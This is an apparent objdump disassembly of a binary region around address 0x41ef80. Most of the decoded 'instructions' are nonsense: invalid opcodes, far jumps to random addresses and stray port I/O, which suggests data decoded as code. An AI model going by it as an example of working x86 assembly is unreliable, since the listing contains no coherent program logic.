  41ef80:	adc    ch,BYTE PTR [ebx]
  41ef82:	xchg   ecx,eax
  41ef83:	mov    gs:0x4d9f5845,eax
  41ef89:	cmp    ebx,DWORD PTR [esi]
  41ef8b:	call   FWORD PTR [edx-0x2d]
  41ef8e:	sub    esi,DWORD PTR [ecx+0x50]
  41ef91:	faddp  st(5),st
  41ef93:	jg     0x41efca
  41ef95:	jo     0x41efab
  41ef97:	and    al,0x7a
  41ef99:	sub    esi,esp
  41ef9b:	jbe    0x41ef4c
  41ef9d:	sahf   
  41ef9e:	and    al,0x58
  41efa0:	adc    DWORD PTR [edi+0x32],edi
  41efa3:	pop    es
  41efa4:	jb     0x41efdf
  41efa6:	push   ds
  41efa7:	sar    BYTE PTR [ecx],cl
  41efa9:	push   0xffffffb8
  41efab:	add    DWORD PTR [edx-0x21afc66],0xffffffcc
  41efb2:	ror    ecx,cl
  41efb4:	scas   al,BYTE PTR es:[edi]
  41efb5:	sub    al,0x1f
  41efb7:	xor    dl,BYTE PTR [ecx]
  41efb9:	dec    ebp
  41efba:	sub    al,0xb9
  41efbc:	inc    edx
  41efbd:	retf   
  41efbe:	dec    edi
  41efbf:	mov    ds:0x561bbf58,eax
  41efc4:	rcl    BYTE PTR [esi+edx*4],cl
  41efc7:	rcl    bh,1
  41efc9:	inc    esp
  41efca:	adc    DWORD PTR [ecx+esi*4-0x6eab3823],0x354a0d8f
  41efd5:	dec    ebx
  41efd6:	fild   QWORD PTR [eax-0x1e1fd561]
  41efdc:	sbb    esp,esi
  41efde:	test   eax,0x9d58d86a
  41efe3:	cli    
  41efe4:	push   ds
  41efe5:	mov    ds:0x1bdabde4,al
  41efea:	scas   eax,DWORD PTR es:[edi]
  41efeb:	jae    0x41ef97
  41efed:	dec    edx
	...
  41f056:	mov    ecx,0xff25bf5d
  41f05b:	out    0xbb,eax
  41f05d:	fisttp QWORD PTR [ecx+0x0]
  41f060:	lock imul edi,DWORD PTR [ebx+0x15],0xffffffb2
  41f065:	sbb    DWORD PTR [edi+0x4d],esp
  41f068:	add    DWORD PTR [eax],eax
  41f06a:	add    BYTE PTR [ecx],al
  41f06c:	add    BYTE PTR [eax],al
  41f06e:	data16 out 0x14,al
  41f071:	sub    DWORD PTR [ebp+0x73fba6f9],esi
  41f077:	xchg   esi,eax
  41f078:	jae    0x41f08b
  41f07a:	sub    BYTE PTR [ebx+0x32],bh
  41f07d:	test   BYTE PTR [ebx-0x59],al
  41f080:	or     DWORD PTR [eax-0x318b8cb7],esp
  41f086:	sbb    al,0xb7
  41f088:	push   ebp
  41f089:	lea    ebp,[ebx+0x17c46439]
  41f08f:	lahf   
  41f090:	xchg   edx,eax
  41f091:	dec    ecx
  41f092:	jmp    0x3022f5c
  41f097:	icebp  
  41f098:	jnp    0x41f027
  41f09a:	test   BYTE PTR [ebx-0x49bba521],dl
  41f0a0:	sti    
  41f0a1:	(bad)  
  41f0a2:	push   0xffffffe9
  41f0a4:	sub    DWORD PTR [ebx+0x57],esp
  41f0a7:	nop
  41f0a8:	push   eax
  41f0a9:	add    BYTE PTR [ecx],bl
  41f0ab:	cmp    ebp,DWORD PTR fs:[edx+ecx*2]
  41f0af:	outs   dx,DWORD PTR ds:[esi]
  41f0b0:	cmp    al,0xb4
  41f0b2:	repnz hlt 
  41f0b4:	inc    edx
  41f0b5:	in     eax,0x3a
  41f0b7:	or     eax,0x4ef7b26
  41f0bc:	les    edx,FWORD PTR [esi+0x5af0b6f4]
  41f0c2:	mov    edx,0xe2bc491e
  41f0c7:	test   BYTE PTR [edx+0x35b1e401],ah
  41f0cd:	mov    ds:0x72441c4f,eax
  41f0d2:	ds push esi
  41f0d4:	ins    DWORD PTR es:[edi],dx
  41f0d5:	pop    ecx
  41f0d6:	popf   
  41f0d7:	repnz es loop 0x41f0d3
  41f0db:	mov    bh,0xb3
  41f0dd:	pop    es
  41f0de:	mov    ch,0xbc
  41f0e0:	std    
  41f0e1:	push   ebp
  41f0e2:	(bad)  
  41f0e4:	push   esi
  41f0e5:	fst    QWORD PTR [ebp-0x4e]
  41f0e8:	sbb    ecx,DWORD PTR [eax-0x14]
  41f0eb:	aaa    
  41f0ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0ed:	mov    ds:0x5c4f0c60,eax
  41f0f2:	jmp    0x115dd56f
  41f0f7:	push   ebx
  41f0f8:	mov    ch,0xcb
  41f0fa:	cs sbb al,0x76
  41f0fd:	sar    DWORD PTR [edi+0x7c],1
  41f100:	pushf  
  41f101:	jno    0x41f17a
  41f103:	repnz jmp 0xf1d0:0x6feae88
  41f10b:	dec    ebx
  41f10c:	and    al,0xff
  41f10e:	push   ebx
  41f10f:	popa   
  41f110:	xchg   ebp,eax
  41f111:	loope  0x41f15c
  41f113:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f114:	pop    ebp
  41f115:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f116:	mov    dh,0x8a
  41f118:	in     al,dx
  41f119:	dec    edi
  41f11a:	mov    BYTE PTR ds:0x590ee3d4,dh
  41f120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f121:	jge    0x41f0e4
  41f123:	call   0xd537:0x34a9fdb4
  41f12a:	xor    esp,edi
  41f12c:	jp     0x41f0fa
  41f12e:	mov    eax,ds:0xc5392e18
  41f133:	fs push esi
  41f135:	jno    0x41f1b6
  41f137:	inc    esp
  41f138:	mov    esp,0xb24f1c47
  41f13d:	jno    0x41f14f
  41f13f:	mov    edx,0x87e97514
  41f144:	pop    ecx
  41f145:	jo     0x41f17d
  41f147:	js     0x41f0d5
  41f149:	ins    BYTE PTR es:[edi],dx
  41f14a:	popf   
  41f14b:	aad    0x95
  41f14d:	dec    edi
  41f14e:	mov    dh,0x8d
  41f150:	mov    ds:0xf1c03c90,al
  41f155:	ins    DWORD PTR es:[edi],dx
  41f156:	jg     0x41f174
  41f158:	iret   
  41f159:	xchg   edx,eax
  41f15a:	mov    ch,0x43
  41f15c:	inc    DWORD PTR [ecx-0x54]
  41f15f:	push   edx
  41f160:	jno    0x41f189
  41f162:	xor    al,0x91
  41f164:	sub    ecx,DWORD PTR [ebp-0x18]
  41f167:	in     eax,0x31
  41f169:	ret    0x2a89
  41f16c:	sub    dh,BYTE PTR [edx+0x0]
	...
  41f1d3:	add    BYTE PTR [eax],al
  41f1d5:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f1db:	mov    ebx,0x3824ffdf
  41f1e0:	(bad)  
  41f1e1:	jmp    0x4e67:0x64fd3e3f
  41f1e8:	add    DWORD PTR [eax],eax
  41f1ea:	add    BYTE PTR [ecx],al
  41f1ec:	add    BYTE PTR [eax],al
  41f1ee:	cdq    
  41f1ef:	xchg   edx,eax
  41f1f0:	xor    ecx,esp
  41f1f2:	cld    
  41f1f3:	xlat   BYTE PTR ds:[ebx]
  41f1f4:	jmp    0x4ecf:0xfed40bd5
  41f1fb:	push   0xffffffef
  41f1fd:	mov    ah,0x34
  41f1ff:	add    dl,BYTE PTR [esi+0x42493cd9]
  41f205:	inc    ebp
  41f206:	adc    DWORD PTR [esi-0x4f9a64ab],0x836acd58
  41f210:	push   edi
  41f211:	jne    0x41f22e
  41f213:	repz mov bl,BYTE PTR [edi-0x28d2fe4d]
  41f21a:	rcr    ch,cl
  41f21c:	and    BYTE PTR [eax],cl
  41f21e:	inc    esi
  41f21f:	and    dl,BYTE PTR [edi-0x36416a5e]
  41f225:	jnp    0x41f285
  41f227:	mov    ?,WORD PTR [edi+0x41]
  41f22a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f22b:	jge    0x41f245
  41f22d:	mov    al,0xb5
  41f22f:	loope  0x41f26a
  41f231:	(bad)  
  41f232:	jbe    0x41f1ed
  41f234:	ins    DWORD PTR es:[edi],dx
  41f235:	mov    ds:0x76138841,al
  41f23a:	adc    BYTE PTR [edx+ecx*4],al
  41f23d:	mov    bh,BYTE PTR [eax-0x18c7af32]
  41f243:	mov    bh,BYTE PTR [esi-0x1b]
  41f246:	mov    cl,0x4d
  41f248:	cmp    eax,0x511eff89
  41f24d:	shl    BYTE PTR [edi-0x3a9200d0],0x6
  41f254:	test   DWORD PTR [ebp+0x53],0xc10adb6b
  41f25b:	xchg   esi,eax
  41f25c:	ds jecxz 0x41f29d
  41f25f:	outs   dx,BYTE PTR ds:[esi]
  41f260:	jnp    0x41f26a
  41f262:	cmp    dh,BYTE PTR [eax+0x30e9f232]
  41f268:	dec    edx
  41f269:	ret    
  41f26a:	(bad)  
  41f26b:	lock adc DWORD PTR [esi],ebp
  41f26e:	lods   eax,DWORD PTR ds:[esi]
  41f26f:	or     al,0xdb
  41f271:	fnstenv [ecx+edi*4]
  41f274:	lahf   
  41f275:	mov    ds,WORD PTR [esi]
  41f277:	lahf   
  41f278:	aad    0x17
  41f27a:	jae    0x41f2bc
  41f27c:	xchg   BYTE PTR [edx+0x39],ah
  41f27f:	inc    ebp
  41f280:	fnsave [edi+ecx*2-0x16207351]
  41f287:	push   esp
  41f288:	into   
  41f289:	stos   BYTE PTR es:[edi],al
  41f28a:	js     0x41f2c0
  41f28c:	pop    esp
  41f28d:	test   eax,0xe0a9156b
  41f292:	popf   
  41f293:	push   ebp
  41f294:	push   ecx
  41f295:	dec    edi
  41f296:	pop    es
  41f297:	mov    ds:0xbe371ad9,al
  41f29c:	dec    ebx
  41f29d:	sub    BYTE PTR [edx+ebx*2+0x35],ah
  41f2a1:	push   0xd8364e0b
  41f2a6:	sub    ebx,0x51
  41f2a9:	xchg   ebp,ebx
  41f2ab:	sbb    DWORD PTR [eax+0x3f],edi
  41f2ae:	outs   dx,BYTE PTR ds:[esi]
  41f2af:	arpl   sp,bp
  41f2b1:	sub    eax,0xa970e2c4
  41f2b6:	lods   eax,DWORD PTR ds:[esi]
  41f2b7:	clc    
  41f2b8:	adc    BYTE PTR [ebx+ebp*8],0x88
  41f2bc:	xor    cl,BYTE PTR [edi+0x50]
  41f2bf:	or     cl,BYTE PTR [eax-0x592898db]
  41f2c5:	fs mov ax,0xaf3f
  41f2ca:	aad    0x88
  41f2cc:	(bad)  
  41f2cd:	dec    eax
  41f2ce:	scas   eax,DWORD PTR es:[edi]
  41f2cf:	xor    dh,bl
  41f2d1:	cmp    eax,0x2317c0b
  41f2d6:	adc    eax,ecx
  41f2d8:	(bad)  
  41f2d9:	mov    ebx,0x8ea86174
  41f2de:	pop    ecx
  41f2df:	dec    edi
  41f2e0:	xor    eax,0x1e1ae93a
  41f2e5:	retf   0x1ea2
  41f2e8:	push   ebx
  41f2e9:	fadd   DWORD PTR [eax+0x6ba5bd]
	...
  41f353:	add    BYTE PTR [eax],al
  41f355:	add    BYTE PTR [ecx+0x1b],dl
  41f358:	jmp    DWORD PTR [esi-0x1]
  41f35b:	out    0xd9,al
  41f35d:	aas    
  41f35e:	jo     0x41f34d
  41f360:	sahf   
  41f361:	jb     0x41f374
  41f363:	ret    
  41f364:	xchg   edi,eax
  41f365:	(bad)  
  41f366:	addr16 dec edi
  41f368:	add    DWORD PTR [eax],eax
  41f36a:	add    BYTE PTR [ecx],al
  41f36c:	add    BYTE PTR [eax],al
  41f36e:	out    0xa1,eax
  41f370:	inc    eax
  41f371:	aas    
  41f372:	retf   
  41f373:	ret    
  41f374:	dec    edi
  41f375:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f376:	pop    ds
  41f377:	outs   dx,DWORD PTR ds:[esi]
  41f378:	push   esp
  41f379:	neg    BYTE PTR [edi-0x8]
  41f37c:	mov    dh,0xaa
  41f37e:	push   es
  41f37f:	fbstp  TBYTE PTR [ebp-0x3f]
  41f382:	xor    eax,0x4cd964a4
  41f387:	in     eax,dx
  41f388:	aad    0xd0
  41f38a:	xchg   ecx,eax
  41f38b:	push   ecx
  41f38c:	js     0x41f3fd
  41f38e:	nop
  41f38f:	pop    es
  41f390:	adc    eax,0xb50647cc
  41f395:	mov    esp,0x4f3a2196
  41f39a:	rcl    BYTE PTR [ecx],1
  41f39c:	int    0xb5
  41f39e:	cld    
  41f39f:	mov    bh,0xb2
  41f3a1:	push   es
  41f3a2:	gs lock jb 0x41f3a8
  41f3a6:	sbb    DWORD PTR [edi+0x5f],esp
  41f3a9:	xor    edi,DWORD PTR [ecx+0x64]
  41f3ac:	out    0x82,eax
  41f3ae:	stos   DWORD PTR es:[edi],eax
  41f3af:	ret    0x53bf
  41f3b2:	dec    ebx
  41f3b3:	xchg   ebp,eax
  41f3b4:	iret   
  41f3b5:	jae    0x41f379
  41f3b7:	gs es jp 0x41f3dc
  41f3bb:	in     al,dx
  41f3bc:	cmp    ch,cl
  41f3be:	adc    BYTE PTR es:[ebx+0x4c],0x93
  41f3c3:	mov    ah,0xe5
  41f3c5:	out    dx,al
  41f3c6:	adc    DWORD PTR [esi+0x487741f3],0xe279c798
  41f3d0:	mov    edi,DWORD PTR [edx-0x3a3f8498]
  41f3d6:	xlat   BYTE PTR ds:[ebx]
  41f3d7:	push   es
  41f3d8:	fwait
  41f3d9:	sub    ebx,esp
  41f3db:	inc    edi
  41f3dc:	ror    DWORD PTR [edi+eiz*2-0x2a],1
  41f3e0:	xor    bh,dl
  41f3e2:	mov    edi,0x4de5b468
  41f3e7:	stc    
  41f3e8:	arpl   WORD PTR [edx-0x6],bx
  41f3eb:	mov    eax,ds:0x77a49567
  41f3f0:	or     al,0x27
  41f3f2:	pop    ecx
  41f3f3:	push   ebp
  41f3f4:	push   0xc75fe59c
  41f3f9:	adc    eax,0xc6fcc341
  41f3fe:	xchg   esp,eax
  41f3ff:	test   al,0x81
  41f401:	call   0xe7ce643b
  41f406:	or     BYTE PTR [edi+0x4573635b],bh
  41f40c:	out    dx,eax
  41f40d:	test   eax,0x79d01f10
  41f412:	iret   
  41f413:	adc    al,0xfc
  41f415:	jge    0x41f480
  41f417:	mov    bl,0x0
  41f419:	mov    bl,cl
  41f41b:	fs cld 
  41f41d:	ror    ebp,cl
  41f41f:	adc    ecx,eax
  41f421:	jmp    0x41f438
  41f423:	cmc    
  41f424:	fwait
  41f425:	add    eax,0x7041e79d
  41f42a:	sbb    ecx,DWORD PTR [ebp-0x4a]
  41f42d:	ret    0x2007
  41f430:	enter  0xa84b,0x1d
  41f434:	ss dec edx
  41f436:	xor    DWORD PTR [ecx-0x67],0x2d862a98
  41f43d:	out    0xf5,eax
  41f43f:	fcmovnu st,st(2)
  41f441:	dec    ebp
  41f442:	mov    gs,ebp
  41f444:	push   ebx
  41f445:	or     edx,DWORD PTR [edi-0x7b2a2453]
  41f44b:	mov    al,ds:0x6641d72e
  41f450:	ret    0x246b
  41f453:	aam    0xc8
  41f455:	pop    ss
  41f456:	arpl   WORD PTR [esi+eax*4+0x4],sp
  41f45a:	or     ebx,DWORD PTR [ebx]
  41f45c:	aam    0xa7
  41f45e:	sbb    BYTE PTR ds:0xaf3d0366,bl
  41f464:	and    eax,0x70b91387
  41f469:	adc    BYTE PTR [edi-0x70],ch
  41f46c:	js     0x41f4bb
	...
  41f4d6:	cmp    al,0xe7
  41f4d8:	imul   ebp,edi,0xfffffffb
  41f4db:	out    dx,eax
  41f4dc:	mov    esp,0xd5fd13f7
  41f4e1:	mov    ch,0x18
  41f4e3:	aas    
  41f4e4:	call   DWORD PTR [ecx]
  41f4e6:	addr16 push eax
  41f4e8:	add    DWORD PTR [eax],eax
  41f4ea:	add    BYTE PTR [ecx],al
  41f4ec:	add    BYTE PTR [eax],al
  41f4ee:	call   0x8f0b941b
  41f4f3:	neg    DWORD PTR ds:0xcfe92af8
  41f4f9:	ss dec ebp
  41f4fb:	cs mov edx,0x9a8a038f
  41f501:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f502:	inc    esp
  41f503:	jmp    0x41f506
  41f505:	pop    ebp
  41f506:	xor    DWORD PTR [esi-0x615e13ff],esi
  41f50c:	(bad)  
  41f50d:	je     0x41f49f
  41f50f:	adc    BYTE PTR [esi+0x32],0x88
  41f513:	jns    0x41f4fe
  41f515:	sub    edx,DWORD PTR ds:0xe0590963
  41f51b:	lock xchg si,ax
  41f51e:	mov    edi,DWORD PTR ss:[eax+0x20bf1e3]
  41f525:	call   0x26fc:0x95a573f6
  41f52c:	inc    ebx
  41f52d:	(bad)  
  41f52e:	adc    BYTE PTR [eax],ch
  41f530:	xor    DWORD PTR [edx+0x40f95816],ebp
  41f536:	add    al,0x13
  41f538:	cmp    BYTE PTR [ecx],dh
  41f53a:	push   esi
  41f53b:	fwait
  41f53c:	xor    BYTE PTR [edi],0x88
  41f53f:	pop    eax
  41f540:	mov    ecx,0x7426acb
  41f545:	fldenv [ebx]
  41f547:	inc    ebp
  41f548:	ret    0x2e29
  41f54b:	lea    edi,[eax+0x6]
  41f54e:	and    al,0x8a
  41f550:	mov    dl,0x98
  41f552:	test   DWORD PTR [ecx-0x4ba20acb],edi
  41f558:	push   0xf1c89ab8
  41f55d:	mov    ecx,0x95a15352
  41f562:	cli    
  41f563:	shl    cl,0x92
  41f566:	xchg   ebp,eax
  41f567:	fsave  [eax-0xc]
  41f56b:	mov    ds:0x2484183a,eax
  41f570:	pop    edx
  41f571:	icebp  
  41f572:	sub    bh,ch
  41f574:	or     BYTE PTR [edi+0x2a40c15],bh
  41f57a:	cmp    eax,0x537ca798
  41f57f:	dec    eax
  41f580:	xlat   BYTE PTR ds:[ebx]
  41f581:	dec    ebx
  41f582:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f583:	jo     0x41f53e
  41f585:	push   esi
  41f586:	adc    DWORD PTR [edi+0x5],0xffffff95
  41f58a:	(bad)  
  41f58b:	adc    ecx,edx
  41f58d:	mov    edi,0x5eff457c
  41f592:	pop    ds
  41f593:	adc    al,0x2c
  41f595:	aam    0x15
  41f597:	nop
  41f598:	mov    ah,0xaf
  41f59a:	in     eax,0xfc
  41f59c:	call   0xcc4d692f
  41f5a1:	shl    DWORD PTR [eax+0x7e10ae4c],cl
  41f5a7:	push   ebp
  41f5a8:	out    0x4b,eax
  41f5aa:	fadd   QWORD PTR [ecx+0x48a21ab2]
  41f5b0:	mov    dh,BYTE PTR [ebx+ecx*8-0x34]
  41f5b4:	out    0x4e,eax
  41f5b6:	sbb    ebp,DWORD PTR [eax]
  41f5b8:	sbb    eax,0xaff6cb49
  41f5bd:	or     BYTE PTR [eax],bh
  41f5bf:	or     BYTE PTR [ecx],al
  41f5c1:	loopne 0x41f564
  41f5c3:	or     edi,DWORD PTR [edx+0x5b217099]
  41f5c9:	push   ebp
  41f5ca:	lea    ebp,[eax+0x1aa1487e]
  41f5d0:	jo     0x41f620
  41f5d2:	xchg   ebx,eax
  41f5d3:	push   esi
  41f5d4:	dec    edi
  41f5d5:	pop    ss
  41f5d6:	sbb    DWORD PTR [edx],edx
  41f5d8:	mov    bh,0x35
  41f5da:	or     dh,BYTE PTR [ecx+0x49]
  41f5dd:	stos   BYTE PTR es:[edi],al
  41f5de:	push   ebx
  41f5df:	shl    DWORD PTR [ebx],0xd1
  41f5e2:	sar    BYTE PTR [esi],1
  41f5e4:	sub    al,0x81
  41f5e6:	xor    eax,0xe3e3972a
  41f5eb:	icebp  
  41f5ec:	call   0x41f678
	...
  41f655:	add    BYTE PTR [eax+0x34],bh
  41f658:	add    bh,bl
  41f65a:	dec    esi
  41f65b:	(bad)  
  41f65c:	stc    
  41f65d:	mov    bh,0xb7
  41f65f:	jmp    0x6bb4:0x697d422
  41f666:	addr16 push ecx
  41f668:	add    DWORD PTR [eax],eax
  41f66a:	add    BYTE PTR [ecx],al
  41f66c:	add    BYTE PTR [eax],al
  41f66e:	loop   0x41f623
  41f670:	(bad)  
  41f671:	and    DWORD PTR [eax],ecx
  41f673:	mov    edx,0x8a7483f7
  41f678:	sbb    eax,0x36896353
  41f67d:	mov    al,ds:0x53c964ec
  41f682:	xchg   edi,eax
  41f683:	jno    0x41f63b
  41f685:	jno    0x41f6d2
  41f687:	jb     0x41f6a3
  41f689:	push   0x63
  41f68b:	add    DWORD PTR [ebp+0x971a0a7],0x834bd460
  41f695:	stc    
  41f696:	es aam 0x6
  41f699:	outs   dx,BYTE PTR ds:[esi]
  41f69a:	mov    eax,0x9b09d4f6
  41f69f:	adc    DWORD PTR [esi+0x1c],ebx
  41f6a2:	jno    0x41f6a7
  41f6a4:	add    BYTE PTR [ecx+0x47a20491],0x14
  41f6ab:	dec    edi
  41f6ac:	iret   
  41f6ad:	int3   
  41f6ae:	inc    eax
  41f6af:	sbb    edi,0xa431e22f
  41f6b5:	ss push esi
  41f6b7:	mov    edi,esp
  41f6b9:	push   esp
  41f6ba:	xor    al,0x5
  41f6bc:	mov    DWORD PTR [ecx-0x54],0xadb7113c
  41f6c3:	pop    es
  41f6c4:	jecxz  0x41f67a
  41f6c6:	xor    edx,DWORD PTR [eax+0x9c90aec]
  41f6cc:	fcomp  DWORD PTR [esi-0xa]
  41f6cf:	add    esp,ebx
  41f6d1:	int    0x7
  41f6d3:	dec    eax
  41f6d4:	in     eax,dx
  41f6d5:	sub    DWORD PTR [edx-0x15],eax
  41f6d8:	retf   0x8eb
  41f6db:	or     BYTE PTR [ebx+eax*1+0x6266cc54],al
  41f6e2:	push   ebx
  41f6e3:	lods   eax,DWORD PTR ds:[esi]
  41f6e4:	frstor [edi+0x1e319583]
  41f6ea:	xor    BYTE PTR [edi-0x4114fd8d],0x5
  41f6f1:	jle    0x41f6df
  41f6f3:	inc    edi
  41f6f4:	sbb    bh,bl
  41f6f6:	pop    esi
  41f6f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6f8:	retf   0xd3ff
  41f6fb:	bound  edi,QWORD PTR [edx+edi*1-0x16351200]
  41f702:	cmp    eax,0xe62188d6
  41f707:	scas   eax,DWORD PTR es:[edi]
  41f708:	xor    ecx,0x2b5039d9
  41f70e:	inc    edx
  41f70f:	jp     0x41f764
  41f711:	add    eax,0x1342df61
  41f716:	(bad)  
  41f717:	pushf  
  41f718:	scas   eax,DWORD PTR es:[edi]
  41f719:	out    0x31,eax
  41f71b:	adc    bl,cl
  41f71d:	repz shr BYTE PTR [eax],0x19
  41f721:	add    DWORD PTR [edx+0x20],ebp
  41f724:	mov    edi,0x3b2054f4
  41f729:	mov    ecx,0x97253cf7
  41f72e:	ret    0x97db
  41f731:	jne    0x41f75e
  41f733:	lahf   
  41f734:	mov    edi,0x4e15470f
  41f739:	xchg   esi,eax
  41f73a:	mov    ecx,DWORD PTR [ecx-0x3c3af0b1]
  41f740:	call   0x6958:0xf964bf48
  41f747:	call   0x9a88:0x109e068d
  41f74e:	std    
  41f74f:	and    ebx,DWORD PTR [ebp-0x42c59b25]
  41f755:	mov    eax,DWORD PTR [esi+0x62]
  41f758:	push   ebx
  41f759:	and    eax,ecx
  41f75b:	mov    ebx,0xf0dca315
  41f760:	cwde   
  41f761:	jecxz  0x41f728
  41f763:	cmc    
  41f764:	daa    
  41f765:	lock fistp QWORD PTR [ebp+0x63]
  41f769:	call   0x9deb150f
	...
  41f7d6:	xchg   edx,eax
  41f7d7:	cmp    al,0x23
  41f7d9:	jle    0x41f78a
  41f7db:	jg     0x41f7bc
  41f7dd:	cld    
  41f7de:	call   0x711b:0x8b6c62d2
  41f7e5:	fldenv [edi+0x52]
  41f7e8:	add    DWORD PTR [eax],eax
  41f7ea:	add    BYTE PTR [ecx],al
  41f7ec:	add    BYTE PTR [eax],al
  41f7ee:	mov    ds:0x86fa0fd9,al
  41f7f3:	rcl    DWORD PTR [esp+ebx*4+0x3],0x52
  41f7f8:	(bad)
  41f7fb:	adc    BYTE PTR [ebp+0x21df404e],dl
  41f801:	(bad)  
  41f802:	sbb    DWORD PTR [ecx+0x4d975157],edi
  41f808:	popa   
  41f809:	jmp    0x41f7c5
  41f80b:	cmp    eax,0xc75f9e2e
  41f810:	adc    dh,BYTE PTR [ebp-0x7]
  41f813:	std    
  41f814:	inc    esp
  41f815:	test   DWORD PTR ds:0x59d53233,esp
  41f81b:	call   0x2206:0x640660bd
  41f822:	add    edx,DWORD PTR ds:0xbcb6ba8a
  41f828:	dec    ebx
  41f829:	retf   
  41f82a:	cld    
  41f82b:	arpl   WORD PTR ds:0x70e94787,bp
  41f831:	outs   dx,DWORD PTR ds:[esi]
  41f832:	xlat   BYTE PTR ds:[ebx]
  41f833:	icebp  
  41f834:	jmp    0x2f26:0x8b9728e8
  41f83b:	test   DWORD PTR [eax+edx*1-0x42308ab7],ebp
  41f842:	push   ebp
  41f843:	xchg   DWORD PTR [ebx+0x3608f599],ebx
  41f849:	sub    eax,0x700fb5f1
  41f84e:	xor    al,0x98
  41f850:	fwait
  41f851:	in     al,dx
  41f852:	jbe    0x41f7f2
  41f854:	jle    0x41f871
  41f856:	inc    eax
  41f857:	jae    0x41f8ac
  41f859:	cmp    dh,bl
  41f85b:	sub    BYTE PTR [ecx+0x24],cl
  41f85e:	jb     0x41f801
  41f860:	sub    DWORD PTR [eax-0x13],esi
  41f863:	sbb    DWORD PTR [ebx],0xb9728271
  41f869:	pop    edi
  41f86a:	sub    cl,BYTE PTR [esi-0x53cdfb9d]
  41f870:	test   DWORD PTR [eax+0x3e],ebx
  41f873:	adc    eax,0x437302d6
  41f878:	and    ebp,DWORD PTR [esi]
  41f87a:	jmp    0x41f855
  41f87c:	dec    esi
  41f87d:	ret    
  41f87e:	ficomp DWORD PTR [edx-0x25]
  41f881:	sti    
  41f882:	sub    edi,DWORD PTR [ebx]
  41f884:	pop    esp
  41f885:	pop    edi
  41f886:	or     al,0x71
  41f888:	sub    BYTE PTR [esi+0x5b],dh
  41f88b:	push   edi
  41f88c:	xchg   ecx,eax
  41f88d:	aas    
  41f88e:	push   ss
  41f88f:	in     eax,dx
  41f890:	mov    dl,0xcb
  41f892:	fs dec edx
  41f894:	sahf   
  41f895:	adc    eax,0x8ca8b385
  41f89a:	or     BYTE PTR [ebx+eiz*8+0x7dda827b],cl
  41f8a1:	std    
  41f8a2:	mov    ecx,0x777f2324
  41f8a7:	adc    al,0x4
  41f8a9:	lds    ebp,FWORD PTR [eax+0x20]
  41f8ac:	xor    al,0x23
  41f8ae:	stos   DWORD PTR es:[edi],eax
  41f8af:	add    BYTE PTR [ebp+eax*8+0xf],bh
  41f8b3:	and    edx,DWORD PTR [ebx]
  41f8b5:	push   0xf5d6552e
  41f8ba:	sub    al,0x26
  41f8bc:	cmp    eax,0xb374d0d5
  41f8c1:	call   0x3b7f:0x4feb9008
  41f8c8:	xchg   ecx,eax
  41f8c9:	sti    
  41f8ca:	adc    BYTE PTR [edi-0x7e],cl
  41f8cd:	enter  0x4901,0x48
  41f8d1:	mov    ds:0x4f08a2d5,al
  41f8d6:	repz je 0x41f941
  41f8d9:	repnz (bad) 
  41f8db:	and    esi,edx
  41f8dd:	add    edi,DWORD PTR [eax-0x46]
  41f8e0:	add    BYTE PTR [ebp-0x237654ef],bl
  41f8e6:	jno    0x41f8f0
  41f8e8:	es mov ch,0x9b
  41f8eb:	or     eax,0xf8b3
	...
  41f954:	add    BYTE PTR [eax],al
  41f956:	mov    eax,ds:0x3b920b9a
  41f95b:	xchg   ebx,eax
  41f95c:	mov    ecx,0x4183febb
  41f961:	pop    edx
  41f962:	retf   
  41f963:	data16 loope 0x41f95a
  41f966:	addr16 push ebx
  41f968:	add    DWORD PTR [eax],eax
  41f96a:	add    BYTE PTR [ecx],al
  41f96c:	add    BYTE PTR [eax],al
  41f96e:	jo     0x41f9a5
  41f970:	ficom  DWORD PTR [esp+eax*1-0x4c]
  41f974:	sahf   
  41f975:	jns    0x41f905
  41f977:	in     al,dx
  41f978:	cmp    DWORD PTR [edi+0x3a7a40fa],esi
  41f97e:	push   ds
  41f97f:	stos   DWORD PTR es:[edi],eax
  41f980:	jae    0x41f926
  41f982:	test   eax,0xf94039d8
  41f987:	mov    eax,ds:0x2c8c4a75
  41f98c:	sub    esp,DWORD PTR [eax-0x2]
  41f98f:	ja     0x41f921
  41f991:	test   BYTE PTR [ebp-0x6afff1b0],0xa3
  41f998:	shl    ah,cl
  41f99a:	ret    0xdc4b
  41f99d:	iret   
  41f99e:	pop    ebp
  41f99f:	scas   al,BYTE PTR es:[edi]
  41f9a0:	mov    DWORD PTR [esi+0x7f7cedce],ebx
  41f9a6:	xor    al,0xcd
  41f9a8:	int3   
  41f9a9:	or     BYTE PTR [ebx+eax*8+0x7f],0x5d
  41f9ae:	mov    bh,0xd6
  41f9b0:	xchg   ebp,eax
  41f9b1:	add    dh,ah
  41f9b3:	call   0x359c:0x78e93cd
  41f9ba:	out    0xeb,eax
  41f9bc:	mov    dl,0xf6
  41f9be:	pop    es
  41f9bf:	and    ecx,DWORD PTR [ebx]
  41f9c1:	sbb    bl,BYTE PTR [ebx-0x514a7f57]
  41f9c7:	das    
  41f9c8:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9ca:	push   ecx
  41f9cb:	fnstcw WORD PTR [edx+0xb]
  41f9ce:	fistp  QWORD PTR [esi+0x5c]
  41f9d1:	call   0x936:0xeb73c69c
  41f9d8:	xchg   edx,eax
  41f9d9:	pop    ecx
  41f9da:	call   0xf7b6:0x20404b1f
  41f9e1:	dec    ecx
  41f9e2:	push   esi
  41f9e3:	sub    al,0xe1
  41f9e5:	sahf   
  41f9e6:	xchg   ecx,eax
  41f9e7:	jmp    0x87a5413a
  41f9ec:	cmp    edx,DWORD PTR [ecx+edi*4]
  41f9ef:	mov    al,0x51
  41f9f1:	leave  
  41f9f2:	adc    ecx,DWORD PTR [eax]
  41f9f4:	leave  
  41f9f5:	add    eax,0x2449f677
  41f9fa:	je     0x41f9d0
  41f9fc:	jno    0x41f9c8
  41f9fe:	sbb    BYTE PTR [ecx-0x9],0x30
